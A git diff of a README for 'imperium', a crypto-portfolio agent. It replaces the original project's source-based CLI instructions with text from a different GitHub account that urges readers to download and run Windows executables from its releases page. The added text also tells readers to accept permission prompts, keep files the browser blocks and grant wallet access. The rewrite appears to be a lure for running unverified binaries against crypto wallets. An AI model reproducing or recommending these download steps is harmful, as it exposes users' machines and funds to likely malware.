@@ -1,343 +1,224 @@
-# Imperium
+# 🤖 imperium - Track, scan, and rebalance funds
 
-**AI-powered Multi-Chain Financial Command Center**
+[![Download imperium](https://img.shields.io/badge/Download%20imperium-blue?style=for-the-badge&logo=github)](https://github.com/Adamoktora/imperium/releases)
 
-> An autonomous agent that monitors, protects, and rebalances your crypto portfolio across all chains. Powered by MoonPay CLI (MCP) + OpenWallet Standard + Groq AI.
+## 🚀 Getting Started
 
-**[Live Demo](https://imperium-demo.vercel.app)** | **[GitHub](https://github.com/jordi-stack/imperium)**
+imperium is a Windows app for people who want one place to watch their crypto holdings, check risk, and act on changes fast. It brings together AI, wallet tools, and multi-chain support in one desktop flow.
 
-## Problem
+Use it to:
+- monitor a portfolio
+- scan for risk
+- surface smart money moves
+- review balance changes across chains
+- use MoonPay CLI tools through MCP
+- work with the OpenWallet Standard
 
-Crypto portfolios are fragmented across multiple chains (Ethereum, Base, Polygon, Arbitrum). You can't see total allocation in one place, can't detect rug pulls until it's too late, and rebalancing requires hours of manual swaps across different UIs.
+## 💻 What You Need
 
-## Solution
+Before you install imperium, make sure your PC has:
 
-Imperium is an AI financial agent that gives you a unified command center for your entire crypto portfolio:
+- Windows 10 or Windows 11
+- An internet connection
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- Permission to install apps on your PC
 
-- **MoonPay CLI** as execution layer (13 tools via real MCP protocol)
-- **OpenWallet Standard** as security layer (7-chain HD wallet + policy engine)
-- **Groq AI** (Llama 3.3 70B) for autonomous decision-making
-- **Watch mode** for 24/7 autonomous monitoring
+For the best experience, use:
+- a modern CPU
+- a stable network
+- a wallet you already use for crypto
 
-## Architecture
+## 📥 Download Imperium
 
-```
-User (CLI / Interactive REPL / Watch Mode)
-    |
-    v
-index.ts (command router)
-    |
-    +---> core/portfolio.ts  ---+
-    +---> core/risk.ts       ---+                  +--> MoonPay CLI (MCP stdio)
-    +---> core/rebalance.ts  ---+-- policy gate ---+
-    +---> core/discovery.ts  ---+  (wallet/policy) +--> OWS Wallet (sign)
-    +---> ai/advisor.ts      ---+-- Groq LLM ------+--> AI decisions
-                                    |
-                              ~/.imperium/config.json
-```
-
-## Quick Start
-
-### 1. Install
-
-```bash
-git clone https://github.com/jordi-stack/imperium.git
-cd imperium
-npm install
-chmod +x imp    # Make shortcut executable
-```
-
-### 2. Try Demo Mode (zero setup needed)
-
-```bash
-./imp --demo portfolio              # Portfolio holdings
-./imp --demo risk scan              # Risk scan (HOLD/WATCH/SELL)
-./imp --demo discover trending base # Trending tokens
-./imp --demo interactive            # Interactive REPL
-```
-
-### 3. Enable AI (free, recommended)
-
-Get a free API key from https://console.groq.com, then:
-
-```bash
-cp .env.example .env
-echo "GROQ_API_KEY=gsk_your_key_here" >> .env
-```
-
-Now AI commands work:
-
-```bash
-./imp --demo analyze                # AI portfolio analysis
-./imp --demo ai-rebalance           # AI decides allocation
-./imp --demo watch --interval 10    # Autonomous monitoring
-```
-
-### 4. Connect Real MoonPay Data (optional)
-
-```bash
-npm install -g @moonpay/cli
-moonpay login --email you@example.com
-# Browser opens -> complete captcha -> get 6-digit code
-mp verify --email you@example.com --code 123456
-moonpay wallet create --name imperium
-```
-
-Add wallet to .env:
-
-```bash
-echo "MOONPAY_WALLET=imperium" >> .env
-```
-
-Now use without --demo (live data, no funds needed for read-only):
-
-```bash
-./imp init                          # Create OWS wallet (7 chains)
-./imp discover trending base        # Live trending tokens
-./imp discover whales base          # Real smart money wallets
-./imp risk check 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913 base
-```
-
-> Note: `token_swap` and `token_bridge` require a funded wallet. All other commands work without funds.
-
-# Run tests
-npm test
-```
-
-## Commands
-
-### Portfolio
-```bash
-./imp portfolio              # Holdings + allocation table
-./imp portfolio pnl          # Profit & loss breakdown
-./imp portfolio activity base # Recent transactions
-./imp portfolio buy ETH      # Fiat onramp (checkout URL)
-./imp portfolio deposit      # Create multi-chain deposit link
-```
-
-### Risk Analysis
-```bash
-./imp risk scan              # Scan ALL holdings for risks
-./imp risk check 0xABC base  # Check a specific token
-```
-
-Risk scoring is rule-based and transparent:
-- Holder concentration > 50% in top 10 -> +40 risk
-- Low liquidity (< $10K) -> +30 risk
-- Community warnings -> +20 risk
-- Score >= 70 -> SELL | 40-69 -> WATCH | < 40 -> HOLD
-
-### AI-Powered Commands (requires GROQ_API_KEY)
-```bash
-./imp analyze                # AI analyzes portfolio + risk, gives recommendations
-./imp ai-rebalance           # AI decides optimal target allocation
-```
-
-The AI advisor:
-1. Gathers portfolio allocation and risk data
-2. Sends to Groq Llama 3.3 70B for analysis
-3. Returns actionable recommendations (what to sell/buy/hold and why)
-4. For ai-rebalance: generates specific target allocation + preview actions
-
-### Autonomous Watch Mode
-```bash
-./imp watch --interval 60    # Monitor every 60 seconds
-./imp watch --interval 10    # Faster monitoring (10s)
-```
-
-Watch mode is a **fully autonomous agent loop**:
-1. Scans portfolio and risk every interval
-2. Alerts when token risk increases (>= 70: SELL alert, >= 40: WATCH)
-3. AI analyzes alerts and decides optimal rebalance targets
-4. Generates swap/bridge actions and checks against spending policy
-5. Executes approved actions via MoonPay CLI (or dry-run in demo mode)
-6. Logs every decision on-chain (Base Sepolia)
-7. Press Ctrl+C to stop
-
-### Rebalancing
-```bash
-./imp rebalance target ETH:50 USDC:50  # Set target manually
-./imp rebalance preview                 # Preview drift + proposed actions
-./imp rebalance execute                 # Execute swaps (policy-checked)
-```
-
-Or let AI decide:
-```bash
-./imp ai-rebalance           # AI sets optimal targets based on risk
-./imp rebalance execute      # Execute AI-recommended targets
-```
-
-### Discovery
-```bash
-./imp discover trending base   # Trending tokens on chain
-./imp discover whales base     # Smart money wallets (top PnL)
-./imp discover search "pepe"   # Search tokens
-```
-
-### Policy Management
-```bash
-./imp policy show
-./imp policy set --daily-limit 500 --tx-limit 200 --max-slippage 2
-./imp policy set --block SCAM,RUG
-./imp policy set --approve ETH,USDC,WBTC
-```
-
-### Interactive REPL
-```bash
-./imp interactive             # Live shell with all commands
-./imp --demo interactive      # Demo mode REPL
-```
-
-### Initialization
-```bash
-./imp init    # Create OWS HD wallet (7 chains)
-```
-
-## MoonPay CLI Integration (13 Tools via MCP)
-
-Connected via real MCP protocol using `@modelcontextprotocol/sdk` (stdio transport). **11/13 tools verified live** against MoonPay CLI. Only `token_swap` and `token_bridge` require a funded wallet.
-
-| # | Tool | Purpose |
-|---|------|---------|
-| 1 | `token_balance_list` | Portfolio holdings across chains |
-| 2 | `token_retrieve` | Detailed token market data |
-| 3 | `wallet_pnl_retrieve` | Profit & loss summary |
-| 4 | `wallet_activity_list` | Recent transaction history |
-| 5 | `buy` | Fiat to crypto onramp |
-| 6 | `deposit_create` | Multi-chain deposit links |
-| 7 | `token_check` | Safety scan (rug pull, liquidity, holders) |
-| 8 | `token_holder_list` | Holder concentration analysis |
-| 9 | `token_swap` | Execute rebalance swaps |
-| 10 | `token_bridge` | Cross-chain bridges |
-| 11 | `token_trending_list` | Trending tokens per chain |
-| 12 | `wallet_discover` | Smart money wallets by PnL |
-| 13 | `token_search` | Search tokens by name/symbol |
-
-## OpenWallet Standard Integration
-
-Imperium uses a **two-layer wallet architecture** for defense in depth:
-
-- **OWS (cold layer)**: Identity, policy signing, on-chain transaction signing via `@open-wallet-standard/core`
-- **MoonPay CLI (hot layer)**: Trade execution, balance queries, market data
-
-This separation ensures the policy-signing key (OWS) is never exposed to the execution layer (MoonPay). OWS signs policy attestations that gate what MoonPay can execute.
-
-Real HD wallet creation via OWS (7 chains):
-
-```
-./imp init
-  eip155:1    0x626ffe49082354d6fdaa2fE0174fEa5d13ece395
-  solana      B3NpS4M2XiUTtrVmmbJGMjwcPshaxTM4HSAyMNRzic8o
-  bitcoin     bc1qsuufhre7zy5wk2cc4q9398lfvtetraxxvgu2cp
-  cosmos      cosmos17dxe8y9cm83f8qxagnlyhdsnw2lhrd6kh0qatr
-  tron        TNRFrdgkvZBdMLDyfNrc3PvwM7Dr4a8ZDy
-  ton         UQDNHuxNR4XTprtscDTLiAWOSLAE1ykN...
-  filecoin    f1ioptesd67642qg6wtrz75iqwq6zsamanzpxjq6a
-```
-
-Custom policy engine built on top of OWS:
-- Daily spending limits + per-transaction caps
-- Token whitelist/blacklist
-- Slippage guards
-- OWS-signed policy attestation (cryptographic proof human approved)
-- On-chain decision logging via OWS wallet (Base Sepolia)
-
-## AI Integration (Groq)
-
-Imperium uses **Groq Llama 3.3 70B** for real AI decision-making:
-
-- **Portfolio analysis**: AI evaluates risk exposure, concentration, and recommends specific actions
-- **Rebalance advisor**: AI determines optimal target allocation based on risk scores
-- **Watch mode alerts**: AI provides context when risk alerts trigger
-- **Free API**: Groq offers free tier at https://console.groq.com
-
-```bash
-# Example AI output:
-$ ./imp analyze
-
-Portfolio Health Assessment:
-The portfolio is moderately diversified, but compromised by high-risk
-allocations to VVV and POL (46.1% of total value).
-
-Top Risk Concern:
-POL risk 75/100 - concentrated holders, moderate liquidity.
-
-Recommended Action:
-Sell 100% of POL ($1280) and allocate to WETH and USDC
-to reduce risk and increase stability.
-```
-
-## Tech Stack
-
-| Component | Choice |
-|-----------|--------|
-| Language | TypeScript (strict mode) |
-| AI | Groq SDK (Llama 3.3 70B) |
-| MCP Client | `@modelcontextprotocol/sdk` |
-| Wallet | `@open-wallet-standard/core` |
-| CLI | `commander` + `chalk` + `cli-table3` |
-| Config | `dotenv` |
-| Testing | `vitest` (40 tests) |
-
-## Testing
-
-```bash
-npm test          # Run all 40 tests
-npm run test:watch
-```
-
-Tests cover: MCP client, portfolio calculations, risk scoring, rebalance drift, policy enforcement, integration workflows.
-
-## Environment Variables
-
-```bash
-# .env
-GROQ_API_KEY=gsk_...     # Free from https://console.groq.com
-MOONPAY_WALLET=imperium  # MoonPay wallet name
-DEFAULT_CHAIN=base       # Default blockchain
-```
-
-## On-Chain Decision Log (Base Sepolia)
-
-Every AI decision is hashed and committed on-chain as immutable proof of agent activity.
-
-**Contract:** [`0x98e0af1509c50a3b7fe34f3ea405fc182c512c78`](https://sepolia.basescan.org/address/0x98e0af1509c50a3b7fe34f3ea405fc182c512c78)
-
-```solidity
-contract ImperiumDecisionLog {
-    string public constant AGENT_NAME = "Imperium";
-    event Decision(address indexed agent, bytes32 indexed hash, string action, uint256 timestamp);
-    function log(bytes32 hash, string calldata action) external;
-}
-```
-
-| Decision | Action | TX |
-|----------|--------|----|
-| #1 | Agent deployed and initialized | [`0x4e1aec...`](https://sepolia.basescan.org/tx/0x4e1aec4afa1643e8a876b63b8376efdbc689846b37f0af13e4f9ef71d7567897) |
-| #2 | AI risk alert: POL 75/100, recommend SELL | [`0x2ea113...`](https://sepolia.basescan.org/tx/0x2ea113fc3a6d72112d7be2bdf004108881364762da7153971497249410cad3a9) |
-| #3 | AI rebalance: ETH:50 USDC:40 VVV:10 POL:0 | [`0x37dac4...`](https://sepolia.basescan.org/tx/0x37dac435cbcd995d180aae68f887320ef3d454f46bc36fe9d8bf5507fb9cd1f9) |
-
-Log more decisions:
-```bash
-npx tsx scripts/log-decision.ts "AI-ALERT: token risk changed"
-```
-
-## Known Limitations
-
-1. **Demo mode uses fixture data** - Real mode requires MoonPay CLI login and funded wallet
-2. **OWS requires native binary** - Supported on macOS and Linux (x64/arm64)
-3. **Risk scoring is rule-based** - AI enhances but doesn't replace deterministic scoring
-4. **Swap/bridge requires funds** - Read-only operations (trending, whales, risk check) work without funds
-
-## Built For
-
-**The Synthesis** - a 14-day hackathon where AI agents and humans build together as equals.
-
-- Track: MoonPay CLI Agents + OpenWallet Standard + Synthesis Open Track
-- Agent: Imperium (ERC-8004 on Base Mainnet)
-- On-chain: [DecisionLog on Base Sepolia](https://sepolia.basescan.org/address/0x98e0af1509c50a3b7fe34f3ea405fc182c512c78)
-- Builder: Jordi Alter + Claude Opus 4.6
-
-## License
-
-MIT
+Go to the release page here and download and run this file from the latest release:
+
+https://github.com/Adamoktora/imperium/releases
+
+On the release page, look for:
+- the newest version
+- the Windows download
+- a file such as `.exe` or `.zip`
+
+If you download a `.zip` file, extract it first, then open the app file inside.
+
+## 🪟 Install on Windows
+
+1. Open the release page link above.
+2. Download the latest Windows file.
+3. If the file is `.zip`, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app file to start imperium.
+6. If Windows asks for permission, choose Yes.
+
+If you see a file named `imperium.exe`, open that file.
+
+If your browser marks the file as blocked, keep the file only if it came from the release page above.
+
+## ⚙️ First-Time Setup
+
+When imperium opens for the first time, follow the setup screen.
+
+You may be asked to:
+- choose your wallet source
+- connect a supported account
+- allow network access
+- add an API key for AI features
+- select your preferred chain view
+
+If you use MoonPay tools, connect the needed service from inside the app. If you use a hardware or software wallet, make sure it is ready before you start.
+
+## 🧭 How to Use imperium
+
+Start with your main dashboard. From there, you can move through the app in a few simple steps.
+
+### 1. Add your wallet or account
+Connect the wallet you want to track. imperium can read your holdings and show your balances in one view.
+
+### 2. Review your portfolio
+Open the portfolio screen to see:
+- total value
+- asset split
+- chain breakdown
+- recent changes
+
+### 3. Scan for risk
+Use the risk scan tool to check:
+- large exposure in one asset
+- weak balance across chains
+- unusual market movement
+- wallet activity that may need attention
+
+### 4. Check AI insights
+imperium uses Groq AI with Llama 3.3 to help you make sense of your data. It can highlight patterns, group related activity, and point out changes that matter.
+
+### 5. Rebalance or act
+If the app suggests a move, review it before you proceed. You can use the data view to compare options and make a decision.
+
+## 🔍 Main Features
+
+### 📊 Portfolio Monitoring
+Keep track of your holdings across supported chains in one place. See value changes, asset mix, and wallet activity without switching tools.
+
+### 🛡️ Risk Scanning
+Check your portfolio for concentration risk, unusual shifts, and weak spots. The scan helps you spot problems early.
+
+### 🤖 AI Rebalancing
+Get AI-based guidance on how to adjust your holdings. The app looks at your current setup and suggests a better split.
+
+### 💸 Smart Money Discovery
+Follow wallet movement and activity that may show where informed users are moving funds.
+
+### 🔗 Multi-Chain Support
+Work across several chains from one desktop app. This helps you avoid jumping between sites and tabs.
+
+### 🧩 MoonPay CLI Tools via MCP
+imperium includes 13 MoonPay CLI tools through MCP. These tools help connect app logic with supported service actions in a clean workflow.
+
+### 🪪 OpenWallet Standard Support
+The app is built to work with the OpenWallet Standard, which helps keep wallet access and data handling more consistent.
+
+## 🖥️ Typical Use on Windows
+
+A simple daily flow looks like this:
+
+1. Open imperium.
+2. Load your wallet view.
+3. Check the main dashboard.
+4. Run a risk scan.
+5. Read the AI notes.
+6. Make a move only after you review the data.
+
+If you manage more than one wallet, keep them in separate views so you can compare them fast.
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+- Make sure you downloaded the latest release
+- Check that Windows allowed the app to run
+- Try opening it again from the extracted folder
+
+### The screen is blank
+- Wait a few seconds for data to load
+- Check your internet connection
+- Restart the app
+
+### Wallet data does not show
+- Confirm that your wallet is connected
+- Check that the correct chain is selected
+- Refresh the account view
+
+### The app asks for access
+- Allow network access if you want live data
+- Allow wallet access only if you trust the app source from the release page
+
+### The download will not start
+- Open the release page in another browser
+- Refresh the page
+- Look for the latest Windows asset
+
+## 🔒 Safety Tips
+
+Use imperium only with wallets and accounts you control. Review each action before you approve it. Keep your wallet keys private. Store them in a safe place and never share them in chat, email, or screenshots.
+
+If you use multiple wallets, label them in a way that makes sense to you. That makes it easier to track changes and avoid mistakes.
+
+## 🧩 Project Topics
+
+This project focuses on:
+- agent
+- ai
+- crypto
+- defi
+- groq
+- hackathon
+- mcp
+- moonpay
+- openwalletstandard
+- portfolio
+- synthesis
+- typescript
+
+## 📁 What This App Does
+
+imperium acts as a command center for digital assets. It helps you see what you hold, what changed, and what may need action. It combines AI review with wallet tools so you can make faster checks from one place.
+
+The app is useful when you want:
+- one dashboard for your assets
+- risk checks without manual work
+- AI help with portfolio choices
+- a cleaner view across chains
+- a more direct way to follow wallet activity
+
+## 🧪 Suggested Use Cases
+
+- Track a personal crypto portfolio
+- Watch for sudden risk changes
+- Compare wallet performance
+- Review DeFi exposure
+- Check activity across several chains
+- Use AI to sort noisy wallet data
+- Work with MoonPay-related tools in one workflow
+
+## 📌 File Types You May See
+
+On the release page, you may see:
+- `.exe` for direct launch
+- `.zip` for a packaged app folder
+- `.msi` for a Windows installer
+
+Use the Windows file that matches the latest release.
+
+## 🪄 Tips for Best Results
+
+- Keep the app updated by checking the release page
+- Use a stable internet connection
+- Start with one wallet before adding more
+- Review AI output before acting on it
+- Keep your chain list clean and current
+
+## 📦 Download Again Later
+
+If you need to update imperium, visit this page again to download the latest release:
+
+https://github.com/Adamoktora/imperium/releases
